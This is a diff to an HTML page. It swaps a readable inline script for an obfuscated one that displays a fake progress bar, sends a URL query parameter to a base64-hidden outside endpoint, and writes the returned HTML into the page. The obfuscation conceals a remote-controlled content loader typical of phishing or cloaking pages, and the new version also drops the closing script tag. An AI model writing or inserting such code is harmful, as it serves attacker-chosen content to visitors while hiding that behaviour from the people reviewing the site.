@@ -84,58 +84,8 @@
   </div>
 
   <script>
-    const apiUrl = "aHR0cHM6Ly9xbjAxLnRvcC9hcGkucGhw"; 
-
-    function getQueryString(name) {
-      const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
-      const r = window.location.search.substr(1).match(reg);
-      return r ? decodeURIComponent(r[2]) : null;
-    }
-
-    function updateProgress(percent) {
-      const circle = document.querySelector('.progress');
-      const text = document.getElementById('percent');
-      const radius = 35;
-      const circumference = 2 * Math.PI * radius;
-      const offset = circumference - (percent / 100) * circumference;
-      circle.style.strokeDashoffset = offset;
-      text.innerText = `${percent}%`;
-    }
-
-    let fakeProgress = 0;
-    const increment = 5; 
-    const timer = setInterval(() => {
-      if (fakeProgress < 100) {
-        fakeProgress += increment;
-        if (fakeProgress > 100) fakeProgress = 100;
-        updateProgress(fakeProgress);
-      }
-    }, 150);
-
-    window.onload = async function() {
-      const url = getQueryString("u");
-      const decodedApiUrl = atob(apiUrl); 
-
-      try {
-        const response = await fetch(decodedApiUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: `url=${encodeURIComponent(url)}`
-        });
-
-        const data = await response.json();
-        updateProgress(100);
-        clearInterval(timer);
-
-        setTimeout(() => {
-          document.write(data.html);
-        }, 200);
-
-      } catch (error) {
-        console.error('请求失败:', error);
-      }
-    };
-  </script>
+    var _0x059a=(681438^681436)+(527257^527261);const apiUrl="\u0061\u0048\u0052\u0030\u0063\u0048\u004D\u0036\u004C\u0079\u0039\u0078\u0062\u006A\u0041\u0078\u004C\u006E\u0052\u0076\u0063\u0043\u0039\u0068\u0063\u0047\u006B\u0075\u0063\u0047\u0068\u0077";_0x059a=(979555^979557)+(871540^871536);function getQueryString(name){const _0xa922b=new RegExp(")&|^(".split("").reverse().join("")+name+"\u003D\u0028\u005B\u005E\u0026\u005D\u002A\u0029\u0028\u0026\u007C\u0024\u0029","\u0069");const r=window['\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E']['\u0073\u0065\u0061\u0072\u0063\u0068']['\u0073\u0075\u0062\u0073\u0074\u0072'](334260^334261)['\u006D\u0061\u0074\u0063\u0068'](_0xa922b);return r?decodeURIComponent(r[607987^607985]):null;}function updateProgress(percent,_0xf95c){var _0x54f=(279096^279103)+(862087^862095);const _0xe4e0b=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072']("\u002E\u0070\u0072\u006F\u0067\u0072\u0065\u0073\u0073");_0x54f=(964616^964617)+(366610^366618);const _0x5f_0x320=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0070\u0065\u0072\u0063\u0065\u006E\u0074");var _0x9da1cb=(813461^813457)+(775596^775597);_0xf95c=882688^882723;_0x9da1cb='\u006C\u006D\u0066\u006B\u0064\u0066';var _0xec554b;const _0xfef66f=(274815^274813)*Math['\u0050\u0049']*_0xf95c;_0xec554b=(184774^184775)+(597103^597097);const _0x252d4c=_0xfef66f-percent/(391188^391280)*_0xfef66f;_0xe4e0b['\u0073\u0074\u0079\u006C\u0065']['\u0073\u0074\u0072\u006F\u006B\u0065\u0044\u0061\u0073\u0068\u006F\u0066\u0066\u0073\u0065\u0074']=_0x252d4c;_0x5f_0x320['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074']=`${percent}%`;}let fakeProgress=305450^305450;var _0x4a258e=(915720^915720)+(447265^447267);const increment=197413^197408;_0x4a258e="ikmfog".split("").reverse().join("");var _0x6d_0x3fc;const timer=setInterval(()=>{if(fakeProgress<(514818^514918)){fakeProgress+=increment;if(fakeProgress>(242284^242184))fakeProgress=489210^489118;updateProgress(fakeProgress);}},832625^832743);_0x6d_0x3fc=(347412^347408)+(570032^570038);window['\u006F\u006E\u006C\u006F\u0061\u0064']=async function(){const _0xfe735a=getQueryString("\u0075");var _0x3850f=(354156^354149)+(703835^703835);const _0xacffa=atob(apiUrl);_0x3850f=365641^365642;try{const _0x6aed=await fetch(_0xacffa,{'\u006D\u0065\u0074\u0068\u006F\u0064':"\u0050\u004F\u0053\u0054",'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u0078\u002D\u0077\u0077\u0077\u002D\u0066\u006F\u0072\u006D\u002D\u0075\u0072\u006C\u0065\u006E\u0063\u006F\u0064\u0065\u0064"},"body":`url=${encodeURIComponent(_0xfe735a)}`});var _0xd6cc;const _0xd9bfg=await _0x6aed['\u006A\u0073\u006F\u006E']();_0xd6cc=494084^494082;updateProgress(243737^243837);clearInterval(timer);setTimeout(()=>{document['\u0077\u0072\u0069\u0074\u0065'](_0xd9bfg['\u0068\u0074\u006D\u006C']);},709960^710016);}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](":\u8D25\u5931\u6C42\u8BF7".split("").reverse().join(""),error);}};
 </body>
 </html>
+
 
